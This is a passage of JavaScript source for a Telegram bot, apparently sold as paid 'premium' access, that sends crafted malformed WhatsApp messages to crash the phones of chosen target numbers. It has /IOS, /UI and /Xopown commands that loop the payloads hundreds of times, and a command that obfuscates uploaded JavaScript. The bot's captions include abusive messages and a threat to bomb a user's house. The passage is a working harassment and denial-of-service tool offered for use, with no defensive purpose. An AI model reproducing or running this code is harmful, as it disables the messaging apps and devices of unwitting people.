body: "© running since 2020 to 20##?",
thumbnail: renlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `𝙏𝙧𝙖𝙨𝙝𝙐𝙞 𝙍𝙚𝙙𝙢𝙞 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : 𝙏𝙧𝙖𝙨𝙝𝙐𝙞 𝙍𝙚𝙙𝙢𝙞"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await sock.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}


async function uisystem(sock, target) {
for (let i = 0; i < 30; i++) {
await hardbot(sock, target)
await invob(sock, target)
}
}

async function Xvcrash(sock, target) {
for (let i = 0; i < 1100; i++) {
await InvobXopown(sock, target)
}
}


function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\nБлядь, ты не премиум, не веди себя так, будто используешь этого бота, ладно? Я расстреляю твой дом бомбой, а?\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/RenXiter" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RenXiter" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/RenIsDev2" }]
      ]
    }
  });
}

  bot.sendPhoto(chatId, randomImage, {
    caption: "```XopownEraa\n🦴X V I N C E N T - C R A S H E R\n╰➤ Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @RenXiter. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.\n──────────────────────────\n-# MetadataBotInfoe\n▢ Version : 5.0\n▢ Developer : RenXopown\n▢ Language : JavaScript \n▢ Runtime : " + runtime + "\n▢ Date : " + date + "\n\nBefore bug must /addsender 62xxx\n\n🍁 𝙋𝙧𝙚𝙨𝙨 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣 𝙗𝙚𝙡𝙤𝙬```",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ʙᴜɢ ᴛʀᴀsʜ", callback_data: "bugmenu" }],
        [{ text: "ᴏwɴᴇʀ", callback_data: "ownermenu" }, { text: "Спасибо", callback_data: "thanksto" }]
      ]
    }
  });
});

bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const newImage = getRandomImage();
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
    newCaption = "```🦠 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘓 𝘌 𝘊 𝘛 𝘐 𝘖 𝘕\n──────────────────────────\n#- TrashBugIos\n▢ /IOS 62xxx\n╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS\n\n#- TrashBugUi\n▢ /UI\n╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.\n\n#- TrashBugXopown\n▢ /Xopown\n╰➤ Bug ini work di semua device dan berlangsung lama\n\nＥ Ｎ Ｃ Ｒ Ｙ Ｐ Ｔ - Ｍ Ｅ Ｎ Ｕ\n▢ /encvincent\n╰➤ Encrypt Dengan Keamanan Tinggi / Hard Encrypt```";
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "ownermenu") {
    newCaption = "```👀 𝘖 𝘞 𝘕 𝘌 𝘙 - 𝘔 𝘌 𝘕 𝘜 \n──────────────────────────\n▢ /addprem <id> <day>\n╰➤ Menambahkan akses pada user\n\n▢ /delprem <id>\n╰➤ Menghapus akses pada user\n\n▢ /addadmin <id>\n╰➤ Menambahkan akses admin pada user\n\n▢ /deladmin <id>\n╰➤ Menghapus akses admin pada user```";
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "thanksto") {
    newCaption = "```👏 𝘛 𝘏 𝘈 𝘕 𝘒 𝘚  -  𝘛 𝘖𝘖 \n──────────────────────────\n▢ Xhiro EsCanor ( Best Teacher )\n▢ Rxhl Official ( Best Teacher )\n▢ Tinn ( My Best Owner )\n▢ JayYuriama ( My Owner )\n▢ AnosVoligoad ( My Owner )\n▢ ViozzHost ( My Owner )\n▢ IshuZaper ( My Owner )\n\n▢ RenXiter ( Developer )\n▢ Kia Imup ( Girlfriend )```";
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "mainmenu") {
    newCaption = "```XopownEraa\n🦴X V I N C E N T - C R A S H E R\n╰➤ Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @RenXiter. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.\n──────────────────────────\n-# MetadataBotInfoe\n▢ Version : 5.0\n▢ Developer : RenXopown\n▢ Language : JavaScript \n▢ Runtime : " + runtime + "\n▢ Date : " + date + "\n\nBefore bug must /addsender 62xxx\n\n🍁 𝙋𝙧𝙚𝙨𝙨 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣 𝙗𝙚𝙡𝙤𝙬```";
    newButtons = [
      [{ text: "ʙᴜɢ ᴛʀᴀsʜ", callback_data: "bugmenu" }],
      [{ text: "ᴏwɴᴇʀ", callback_data: "ownermenu" }, { text: "Спасибо", callback_data: "thanksto" }]
    ];
  }

  bot.editMessageMedia(
    {
      type: "photo",
      media: newImage,
      caption: newCaption,
      parse_mode: "Markdown"
    },
    { chat_id: chatId, message_id: messageId }
  ).then(() => {
    bot.editMessageReplyMarkup(
      { inline_keyboard: newButtons },
      { chat_id: chatId, message_id: messageId }
    );
  }).catch((err) => {
    console.error("Error editing message:", err);
  });
});


//=======CASE BUG=========//

bot.onText(/\/IOS (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\nБлядь, ты не премиум, не веди себя так, будто используешь этого бота, ладно? Я расстреляю твой дом бомбой, а?\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/RenXiter" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RenXiter" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/RenXiter" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘐 𝘖 𝘚
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘐 𝘖 𝘚
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await Xvcrash(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘐 𝘖 𝘚
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});




bot.onText(/\/UI (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\nБлядь, ты не премиум, не веди себя так, будто используешь этого бота, ладно? Я расстреляю твой дом бомбой, а?\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/RenXiter" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RenXiter" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/RenXiter" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - Ｕ Ｉ
╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - Ｕ Ｉ
╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await uisystem(sessions.values().next().value, jid);
    await Xvcrash(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - Ｕ Ｉ
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/Xopown (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\nБлядь, ты не премиум, не веди себя так, будто используешь этого бота, ладно? Я расстреляю твой дом бомбой, а?\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/RenXiter" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RenXiter" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/RenXiter" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - Ｘ Ｏ Ｐ Ｏ Ｗ Ｎ
╰➤ Bug ini work di semua device dan berlangsung lama
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - Ｘ Ｏ Ｐ Ｏ Ｗ Ｎ
╰➤ Bug ini work di semua device dan berlangsung lama
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await Xvcrash(sessions.values().next().value, jid);
    await Xvcrash(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - Ｘ Ｏ Ｐ Ｏ Ｗ Ｎ
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// Enc Fiture

bot.onText(/\/encvincent/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id.toString();

    // Cek Premium User
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: "```\nБлядь, ты не премиум, не веди себя так, будто используешь этого бота, ладно? Я расстреляю твой дом бомбой, а?\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
            parse_mode: "MarkdownV2",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/RenXiter" }],
                    [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RenXiter" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/RenXiter" }]
                ]
            }
        });
    }

    // Cek apakah balas pesan dengan file
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/encvincent`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `vincent-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");

        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

        // **Perbaikan pengambilan file dari Telegram**
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");

        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

        // Cek apakah file valid sebelum dienkripsi
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");

        // Proses enkripsi menggunakan Vincent Chaos Core
        const obfuscated = await JsConfuser.obfuscate(fileContent, getVincentObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;

        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        // Cek apakah hasil enkripsi valid
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

        await fs.promises.writeFile(encryptedPath, obfuscatedCode);

        // Kirim file hasil enkripsi
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "✅ *File terenkripsi (Vincent Chaos Core) siap!*\n_©𝙍𝙚𝙣𝙣Хороший_",
            parse_mode: "Markdown"
        });

        await updateProgress(bot, chatId, progressMessage, 100, "Vincent Chaos Core Selesai");

        // Hapus file setelah dikirim
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });

        // Hapus file jika ada error
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    }
});

//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "⛧ ＬＩＳＴ ＰＲＥＭＩＵＭ ⛧\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
